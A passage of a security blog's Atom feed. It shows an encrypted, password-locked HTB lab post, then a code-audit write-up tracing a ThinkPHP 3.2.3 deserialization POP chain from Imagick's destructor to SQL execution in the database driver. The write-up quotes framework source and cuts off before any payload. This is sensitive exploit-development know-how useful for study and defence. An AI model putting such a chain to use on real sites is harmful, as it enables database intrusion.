9d5cf3494952ff482b894f003ce53530e7f2d533018612a8ed21552cd135c0c177a81a6d4caf3c17a567f3ca9981aa5b189e9c9f21becee330ee0590cfe46921244fb6fe1184b719d93257be2c7c3827ed6f15135c88fa24ec8927cf45291ed9e57bf56a526f9f2f14c3b7ccdb4aa34f170df98bfbaa677fb90029a4482a83e62f80fe268cc18f6e148816b24166cdc01fd8de3eed7163448a1f977a1995d1a98a2815bba7509f39c840423f55bd5da0f3f16830f7e26890d447615ae471b5e2b4d611b8ec31fdb5e17539fadc952929c401e484cf6c69a71aea5f7c36ddd3841dad9b33c355677ef832fb80fb786c2ddb5da5be3c09e7439e67a894456a31dcde965be1b24b5808717e20421c6856a010518d6f73d3514ab994334385213c492c9055f13b2a6a0d769edd3cddf4bdd9e908443174b23dfcab057a1f0152098e54dc40c4857ba5d2b6660ddf5202b2684a324b11db991f91d2222093726f54cc98e293f4610fa9c688ab641555322a0995795e25eafd47c3add29c4551093e45699fae9b5f048b9f0790af87eab86422f22d3055435c7dcf307ce22ae113541c686fcf8f0ace2fbfec42414d62dc74ba7d15a72886f59940c71e08808ab4008155f5320c517f212bd84081ea3ad8e31774d5cd81653f1a9b0eff0107ece026e9513bc7088d54855e4db96a009dfab46c68b33bc2219b9ebfd52d5fe316ad225ed6b736106540655f5334f1bb6a401ec8c68ff13781c14e8cb0edbab0c7b5068d510a18ef52cb490cc87b62f94b74a572f94dce73b94fe57e2f6c1665749dec401fb11f412640755f0b590ae443bae89e5159b2192cf08b5e1a89a9e77c303342f20bf737b52085ab4c45710e47994a87c26045a807f7cf8b438f8d74693a9d416478fd59b2e529a8291c519f6c517238f6168776c8f4739636f46b01b21173990a3ab620f8341c898fbf0765eb17f1a113f4a05a131041a86133c7ce6a1672d95907e59cf1cc53cf6ccd1593d22cf0c75a6248a80484f9287ab76d137fbe048049e12723c79eb3c23435246a50b23e0f330b6597449ab27b96961f3872908efffa3fc6d34e3efed63552d6a65d6ce7912d4e9048b5902b725599450a454949f89456a145f73db0130ed0866200cf6a94a9b675da6d5810eb7c65a5355c3de353ff0c07b403c04524457d5f8965b7fa3809ece661711f8df53df3fb6ccd8d25d2a156723bfd26be2e37464a66b8f1d896265a577a9a6f0fcb11e9f60a37b73d1aa73769f24af3435534181a15b7970c3b72cbc1bc4c7285e0496eac4fefae608ebf7f0737c93f104060f7192b9dc761e139f55bf663e640db6976f4e148f0358d39490e5f359299196a8867788a959ceb80baa9a9a7d56a24bd7139616b6a8f69b14d474e729a3d715c0988ca3c412eed246a8ed309abd6ef9d271e6e0ee4b371dd6a0a562fcdb69f09dca063796a1801cd6eef1ca0baf967b5e91e1b6439543b3757f77636ec5a2dd7021e87ec12fa0f14ea44926277f0431de6d6fd8200bcc48975d132c06a9d93f0b438da4967d51851b42d09d761b125a6baaf9c49d484ec99f3973d680a885648f4ae195706a0f84de9f47d1d98593bdb249814eb458de087812acd3bcd6f63035ab02a506e276221225fa92f11c6aaa377abecbef86eb30999fd7a066422f7fe9f36cf96b9db1d8ea4aadfc965155754d68349d237159ac5e9efe51943a7049d1ed8a3bf398e49b2d1d5f4371e416db9b2a6e83b5c746bc117d3decc1103dcfac9bc80838d879998af5338cb9e0f507bd0a9a6cbf8910cc3ef823cadabf1b91accdcd23b141968fde5cc086e42cef8c4e5ee9c914dc204e1bbff4fc7b944835152cc8da1b4667a1c295dfa0307737c6fe527c242291a63c69f0b39534b79d52eb9b1635a247394d0e5554ff815b6ec07ed5372644faf0953a425d5f338fb4aabb1729efb056204ee9928aea23cbbb57adc5be42f62d12fe32aa3bb47414640a5192eed7548766afc3c351e7837d7b3ebb4eb48d6df87d4349e2e150d07b587727cbf31ca9686e807b23802f17b48161d18b06ca3ab8654444b6d07b5aae042e5339720e4a34c72f5201fa294f2ee6a9145f7aef047daf942377b96a332d597cfd6a9671e4cc7c056e968e90aee6cba2c266974b7ad82c3f027d4b455d7df0581d0b71a56b3c7fb43713b6038c163a065c595d31fe85d91b2641ffcb707d269fbcc4c646626e6b9f601859740131d0998e86d83339f88852b2cc3c706faf779618102badae2610eb5ab2e7db404d6f294a7a2061bc6fd09e464edf1f0978731b3dd747207f7a36ecb20593da9f073a31d0329c9b3dd248552a9eaa08d25c956c654a2451c0edf7a6bb0f15426f101f088ca5ede31115551436d07f85073eb195aa20cff08e7d16c0df9e34b36837aa1ba7ebfbb9fad4807492c9026795cb36f0983c8b7d306e9a4f88c63f6ac3994e73c639238c441cb08d7533d22bec648d92ecd42da8917e776b078a788999c27ec1d6c4d3684796b59550d7a24df9273eb8851156afeebf98b5e5e90011cf462e92466730ec89c712c7140ce3a9a9187baa6f5206fb4918675bf2b7b95e6f67857562a14d802600276fd86053820bf9f3c8c23b69c49aae7eaf45dfe01ffa6a05179c4a9344b8527b7ba4c00a16956b8f5cae4885772238c0b72ce0779055d244e677774aa5d7b6180e00f0ab55418fea6b182aa1619d72973dbb88456135e7839d0305b89791525e48cd0287ccb42e84553f14641612889b939a30201f74da879b7b7091fb8baf3c2b0dda45375b1177532dfa921ba963c40c6cc8260255d0cc0b9709420dc5c94ccd4215f4ff3f7359ddf4768c5b752b24b3d82c40a5dfaedaa3fc16cc64777948b0c0c81ed190a8e9746dc6fcf95acbfef5cc1970e0757b02974957b5c3baf0edb1c16d55d59778ab9dfcab16196813b97ee44d47469ce5a4310edf59c8d2ee42e8b2b498572973c89517d091d6cbd8fde4f5c1099345fb86db3e6ffdeb58209b25dc3cd5b2c7374070804d7c6b811fda6222ec1ca770eea7d2cded2261a2dcc43a5fcbc00d6eb5355b6a24f6c6f7c1068a7e164733bf26780efb26c0bc272a646a225ccd8c3e3ed361e66b8812bfcb0097e26e6a5a3a9bdd78d37ae1121b8941bfdd6fde29807f784648cd9740d0710aaece0755018e18c4d19d4097a1743d0e6abfac8560a2a019ed824e22d6167ebbac9c88ea47dccf4959fca0faccf5232c59d93446c964e7aedce224df9de4420d7b4ed556c0d73aa7d670f0ceaf69a3528eb5e102e3bd0ece6c01cae3e65e9f4e2f5932e673ce08933b223a6fc2162456f81d18a82dcdb2c6dbd0253078a964d94f8c57eae45023ee1279661946fec92786ae00eed4662edf62db38fa8aad1ad9631de93d9426e32f942a78617d6be96e34c383bfa7ce98363d1c59cbd6b3b405fe06dfda49729e3439e2e9197e525dc10e6abad6f80c2f1ece04cad1f4ac577cdc2f066e28e758f7511e4499154162e5d79e3b8beff8b34986ffa17e5d9fac5b072c1be04230ae0c309913f1f4f57812f1c03d0a8692d72e1e1ac853b22852a8ad22ca5b9f050e2e021b352c5c24233cf17b061c92b9c54f561de0204f02b028f371df174caefdb28ad9aaa94434e3782b814150a50cc9ea67258210f2f729d683d8c1f73baf592e36cd1358bc828c3b3ab161cfd3aaf4bb478e9b85831ca0cb2b9a2b0a985ee2fdb9fa5fe2268cdb03ab121e967fb1e48dd987c749a6da73b384a939a39524bc2df882c229aabc981e808a949180726048fed8dac1b83a74116fe4b87daa52b8b926d5c5904ef88a52fcd61231384f97aee71b3275a34bceaa94def252d12eb8900503fdc8d78d0fcf3ddd7ef410e28d12019d4717127e0f0c0a0bb0d995723a1e976fa3503a0c21648d82a58d12fc84b873e2288486edc4f935137cc0eea83b90bf1035c01e790dee814c886437eb8fe6dd6ba3ee900771e870774607e68407b26a256b227efdc9203a35816cabba4da4c37a97a631947e484977ea706330a8b5dcecc1769963aeeb1bd80575240017ce567619d0b0237204ab0f7c49eec909ce5d177083bc17cd4c68549d7f407381171cf9173eb59e91b287fb46fc16f7bf3a2f4d43659e7ceca4036475ac645959c0801a2e9cf66793841fb33aa8497634aee36348387896bb326b9fe11e67f9848317012908b8f69085c088576cd9ebf5cd9c198851215a3ec3d16a0d4804dca4ef90893e93b4f2b70f3781567a0d00f1e9e1a6981a606b826abc63bb0b76fd51fee0655cd501b87aab2862d93225f24433bcee076e41a3a030515c506403371ff627962cb39d06a041b8fce57505b5effe844572a2ae7b9826f7dc7491d1597896ddd674ffa51ac864c78b2327fbb45935671958fc556408cd1132dc419e225e73852d646dcbd77deaaac34747491b4c3738ff6622399f423673b0da3a76ae9004c8ff3b66a490b734a7bcab795142d82296c198a589ecadf112c86d71076baf4391ebea0c2c33931670901b2fc59e610e5ba59f7e9de44b4758e6d50889e4272eb2a5c19966324018857fb2e7046e88353bf5e50cb718ddad01b5a76642c350ff3ef07e4701b6116330990b2114b41ef820e4d8f836ce344a46e3d0248eaf0a244d6f3238870338183e77f32d3b246e360d6ae62d0fd6bedae327101622e155922e2970e2ac992320bfcb434cea98c9577382e8407ab45c6dcb0485313818a0b19ae0ebcce96fff0a6e461712517f34bd870dfb751691679de41ca58cf84216051e47457710b9daf10eb48ca432b781279218f7caff2dfc3fe696eebc12b70fdf6ae109103dc1b1fa4e40940a6941b46675404ef4c98fda247c67f092b17fd47db349f2600fd585d13e2c659eff5a5c18cbff436848fb31fb69b6bb8549597acc7893338c01673ab03396a1bf675d7cad881085ece822f054d55f624d71b78b1038ddf6fa71e3d2a99547d244d6df62d24f1e4d1d5348d64475a13b4e8f6ce3f79813db4ebe2e7e189d517544ab63b5a455d925cf90da8bcb0df9d7970ad41719a51721950049e37f06f1e42eb640642827f5c014b1a979c52e1dfc5ab13af3d255e8a57cd21dbd02418a3f50909f5097a63f60a1aff200586aa95f3fdc435f10e1d507739c6896015c3cfcb5c60cffb0e8657c0a57c21e227bce90cbae88c37cc7d21c27b3ed9b4a3f2af79ee8c98a5bdb321874b7f35c5e03300f8a528af46e15cda7b4108854f290828fd3919e1576d7e89c8b536e0757988a15e738651ecf5af1a84960e9fffbd18f19d896099175349b4193cb0b2b1bc6d2924d00fb95c1d3879a7eb7fb89057cf8768d60f8995063ca50e071c95e4dfcf24885c12d461a69be8d90cb29e80807e1c2394e48a5c33720108b76c6573250771fee6a3c40a8ef96650d35593cd850f3dcfa4611f8b0a91a54a5777b676c1ccbb750bbe1d67f95b431189140cfaea80639cf389e94f0052f35ad017b04536e8cbfe844a782363266aaab35b4201c729ab070e86bc65abcd5d3e46d41d7a8a0df391824df3f9d2f1fffe0bee4638020d57c0b599ee9d64d1c44eedd35126424e4005fc27aafa5c3af8330e2732d89b091d049a241ff97844dd5fb3738bf5a110ce7390c5da26c441d6d5776610950db3c3b7f23f52d03c99e32da7d65f342a85758cab78b2ed349c774dda1f9791366d814d30d299fb5a33c5ceb624816b734bb72cb2564185773ebee327b8426d6daa9ffe23a7ad40e6c8f7ce79f6b309a800cc21cd03bf5d780343fb6824fd71e8c84040566c80c463cce178b34effa7bd13976e293da9f04a0e4da65e2d6f909af9ae8948d7ccdb95c94e4535b1541785daace001314c7a134e9f5ad60219bce6a343de8a2c03d75c224d07dd0568e73a01a33481fdb03d00bb7544b4255358c43acaa6909ee55ef362460ff595686969c7e975b08cbb020e4670926cb2be96451fbc596c88f0c9d007c0e7672c5d89988982f3a95b1b6037da9dba1a31ed9e8df1749eb87941324b43a9b1dcbdb0dd5de5f8e75d31fee306fb80cbdbbe163a401194d35d4031b1d59e98170eaa2f28537158e3daa93f93f6bbc2fa2a8e5646788c71022bb2f2e69d2b21eb815f85c4e3eb60966751800867a497bf31a7f45517024fbf62e8150c71bd481a45395f0fe2bea19f0622bf40609ecea2e85f99f7ca3c9464facb8a68b5d9b4c96eb57fb945c07abf427273bc26ecbfca4a257e4bda4d4d1455e6520d7b672d1caa8ef8f94d92958858c0fcc80946e8d7687534fc910013dcf1b1bbefd2f11e09303a4ff34bdca8a4725715d3e7df9e1ba6f0e0620651a3df87fd54f042056a9c2a08d75f9c2641f2bcf591644dcdc1dc06759c4cf73c09388942aa9da9c0c37fe1bf48039a6146901c0c42a568647bb651fa339af02d1d3d3e95ebcd1bc0d9f5f34e909f3ab2292b11b39550a60351948e8fd7d4d1d60d493c8db44a5371aa3b91184d0809d7425b18ae3ff4efbdaded030fedd4edc8274b96f41034e1f491a33a694d718ce3a4cc89717352b50046535ce5a0b59e9670db7e998ad3df2ace14801762b3f9f439d54d817a95bed06431ee048ad7b9a107b19d16ea135096136a6b5ced4f301b5d9f783e362fbdfb6dd484e2f05135abb38d53ddde8e91acbfddd5cf1a66d1d6eefd61b011c2fa9ebf76f58be1db4757a2b8df6842771527da51c02c6238427035658f0dec0547c9ab45d7d41a6128e1f4d1e64e78dd370c227e305a183b2fa1c72f2f1102ffe58412829e80c20da8d4f18d507667569208c929dac7b95aa109497daddc550dbda4a2ed683dc860ca378c2d2a86d8eaf189fa4e468a310d87d4509ca01c119eb4b1cec5ef3dec8d32047e115c81a36d0617e7c796104a45ac0fba806d3fa9cbb5a7514da34d14c42a30f24564821a2d2f9706689cf5042bfcd0c39aa826007def531591cd69e241bf21f6b495229e6283864ebf04b4bd59e69b4a6e8ca616019b8fa316130a3a20c2e42b86e284fe5e9da82729f21b62d7b2e929c49b748eb621d943d362984bfd85f073882d099952448b10ca0cff900f242d8b9baeea0bad95bd969737c0157ace29fddb4d02e8bae768515fcac2213252bccc0e36fdf2f180f57bab764edb353f7a929fd8b564ff2faf3545dd1a75c6e83721b4781756abd39b8cc076ed094d6dcd767e637d637f7133285ca3aac11ac999bf610cd7736a5b0315b2424b4c7fc3e1e80c511743664da5a86000049b187be421188898944aed2f53aac4310029890a0c39f104abf8fa0b87b8fd75db94a3474bf676766e11554ad94ffc559af039f6d44a0633fde6e132806e62c4adfb2c32d43a7d9cb3738f5a8e6d7d9f03e5925eb348170919c6a3638994bd1540ec7b9cd9b5624f9e074bd85450573f810b619c3e6e80e7be082ed2ec79b0f3e2027355385936c42b98f84a27f56d6e31e6b0c344141ec94c2e8d79cbb2063462d7bbcc625b2968a35a8a5e35f165b4b2714a287f7f7abb55c8a9fc5a486e4dbb5a48696dca64639cb73effd815a2557be7a470a67ca50096944d5a4272d65e3d59c2efc6fbdb76d4881d3c4b47fd64570cb7f2bf10b15e0bbb4bd2edbba819002843c425d62211d61e410156839c2527f22213fa48b8552e5dffd6968e8a6aa4aa13b71b625de5eb6f6021d8aed578734aa96211dd6d6eb964524cac91b3b9db5a6f29b9cba8ecf59e43214a86576a0929d30007635b3c62c26bb3c7223cbc17fab34296c5d0aa1d8f2542862147c63b1724f91419a3d13c2c6f427e94f6984daaff79dbc9d06405c64c79982705faaacf094b51c68748d58bb0b407991a6a97c40137a20b58f178a38c742e19ea0d7f8a29d56aae17e39828a0b180282c227523e6e4a52f5a12a59b3c71abac42273251b6c1e8118dce85f54d7da54cc88b68758e533dc46a0282d5a9b1330ac86522ae5f1872075f0c6a16ebc3b3fcc0c4c2dfb1cab8e773017a63268afde4aefe4a6419086d10b89c9783cec1736be8102cdcb294af924c20144313066dad30cf55</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"/>
    
    
      <category term="靶机" scheme="http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="HTB" scheme="http://ca0y1h.top/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>TP3.0反序列化POP链+MySQL伪造恶意服务端</title>
    <link href="http://ca0y1h.top/code_audit/PHP/15.TP3.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE-MySQL%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF/"/>
    <id>http://ca0y1h.top/code_audit/PHP/15.TP3.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE-MySQL%E4%BC%AA%E9%80%A0%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E7%AB%AF/</id>
    <published>2021-01-21T07:06:32.000Z</published>
    <updated>2021-01-21T07:07:48.691Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TP3-0反序列化POP链-MySQL伪造恶意服务端">TP3.0反序列化POP链+MySQL伪造恶意服务端</h1><blockquote><p>Reference: 米斯特安全团队 <a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p></blockquote><h2 id="测试环境">测试环境</h2><ul><li>OS: <code>MAC OS</code></li><li>PHP: <code>5.6.40</code></li><li>ThinkPHP: <code>3.2.3</code></li></ul><h2 id="环境搭建">环境搭建</h2><p>使用composer拉取源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink&#x2F;thinkphp&#x3D;3.2.3 tp3</span><br></pre></td></tr></table></figure><p>框架会生成一个默认的控制器，访问首页显示<code>欢迎使用ThinkPHP！</code>。</p><p>更改这个默认的控制器：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120114943.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120115003.png" alt=""></p><h2 id="POP链分析">POP链分析</h2><h3 id="起点">起点</h3><p>文件：<code>/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120115132.png" alt=""></p><p><code>img</code>参数可控，这里有两个思路，一是可以接着寻找<code>destroy()</code>函数，二是可以寻找不存在<code>destroy()</code>函数的类从而触发<code>__call()</code>方法。</p><h3 id="跳板1">跳板1</h3><p>首先还是全局查找<code>function destroy(</code>，找到一个可用的跳板类。</p><p>文件：<code>/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120115536.png" alt=""></p><p>这里的<code>$this-&gt;handle</code>可控，并且调用了<code>$this-&gt;handle</code>的<code>delete()</code>方法，且传过去的参数是部分可控的，因此我们可以继续寻找有<code>delete()</code>方法的跳板类。</p><p>有点问题的地方在于这里的<code>destroy()</code>方法需要传入一个<code>$sessID</code>，但是前面<code>Imagick::__destruct</code>中调用<code>destroy()</code>方法的时候并没有传值，在PHP7的版本下会抛出异常。</p><h3 id="跳板2">跳板2</h3><p>全局搜索<code>function delete(</code>，找到一个<code>Model</code>类。</p><p>文件：<code>/ThinkPHP/Library/Think/Model.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params">$options = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $pk = <span class="keyword">$this</span>-&gt;getPk();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($options) &amp;&amp; <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 如果删除条件为空 则删除当前数据对象所对应的记录</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[$pk])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;delete(<span class="keyword">$this</span>-&gt;data[$pk]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($options) || is_string($options)) &#123;</span><br><span class="line">            <span class="comment">// 根据主键删除记录</span></span><br><span class="line">            <span class="keyword">if</span> (strpos($options, <span class="string">&#x27;,&#x27;</span>)) &#123;</span><br><span class="line">                $where[$pk] = <span class="keyword">array</span>(<span class="string">&#x27;IN&#x27;</span>, $options);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $where[$pk] = $options;</span><br><span class="line">            &#125;</span><br><span class="line">            $options          = <span class="keyword">array</span>();</span><br><span class="line">            $options[<span class="string">&#x27;where&#x27;</span>] = $where;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 根据复合主键删除记录</span></span><br><span class="line">        <span class="keyword">if</span> (is_array($options) &amp;&amp; (count($options) &gt; <span class="number">0</span>) &amp;&amp; is_array($pk)) &#123;</span><br><span class="line">            $count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (array_keys($options) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_int($key)) &#123;</span><br><span class="line">                    $count++;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (count($pk) == $count) &#123;</span><br><span class="line">                $i = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">foreach</span> ($pk <span class="keyword">as</span> $field) &#123;</span><br><span class="line">                    $where[$field] = $options[$i];</span><br><span class="line">                    <span class="keyword">unset</span>($options[$i++]);</span><br><span class="line">                &#125;</span><br><span class="line">                $options[<span class="string">&#x27;where&#x27;</span>] = $where;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 分析表达式</span></span><br><span class="line">        $options = <span class="keyword">$this</span>-&gt;_parseOptions($options);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_array($options[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($options[<span class="string">&#x27;where&#x27;</span>][$pk])) &#123;</span><br><span class="line">            $pkValue = $options[<span class="string">&#x27;where&#x27;</span>][$pk];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="keyword">$this</span>-&gt;_before_delete($options)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;db-&gt;delete($options);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== $result &amp;&amp; is_numeric($result)) &#123;</span><br><span class="line">            $data = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($pkValue)) &#123;</span><br><span class="line">                $data[$pk] = $pkValue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_after_delete($data, $options);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 返回删除记录个数</span></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>$pk</code>其实就是<code>$this-&gt;pk</code>，是完全可控的。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120120035.png" alt=""></p><p>首先来看第一个if语句，<code>$options</code>是从跳板1传过来的，在跳板1中可以控制其是否为空。<code>$this-&gt;options['where']</code>是成员属性，是可控的，而且嵌套的if语句中<code>data</code>参数也是可控的，那么符合条件后，又调用了一次自己<code>$this-&gt;delete()</code>，但是这时候的参数<code>$this-&gt;data[$pk]</code>是我们可控的。</p><p>这时<code>delete()</code>我们就可以成功带完全可控参数访问了。</p><p>最终这个函数会调用具体数据库驱动类中的<code>delete()</code>中去，即：<code>$result = $this-&gt;db-&gt;delete($options);</code>，那么这时候我们就可以调用任意自带的数据库类中的<code>delete()</code>方法了。</p><h3 id="终点">终点</h3><p>文件：<code>/ThinkPHP/Library/Think/Db/Driver.class.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120121706.png" alt=""></p><p><code>$table</code>是可控的，将<code>$table</code>拼接到<code>$sql</code>传入了<code>$this-&gt;execute()</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">$str, $fetchSql = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initConnect(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_linkID) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;queryStr = $str;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;bind)) &#123;</span><br><span class="line">            $that           = <span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queryStr = strtr(<span class="keyword">$this</span>-&gt;queryStr, array_map(<span class="function"><span class="keyword">function</span> (<span class="params">$val</span>) <span class="title">use</span> (<span class="params">$that</span>) </span>&#123;<span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span> . $that-&gt;escapeString($val) . <span class="string">&#x27;\&#x27;&#x27;</span>;&#125;, <span class="keyword">$this</span>-&gt;bind));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($fetchSql) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;queryStr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//释放前次的查询结果</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;PDOStatement)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;free();</span><br><span class="line">        &#125;</span><br><span 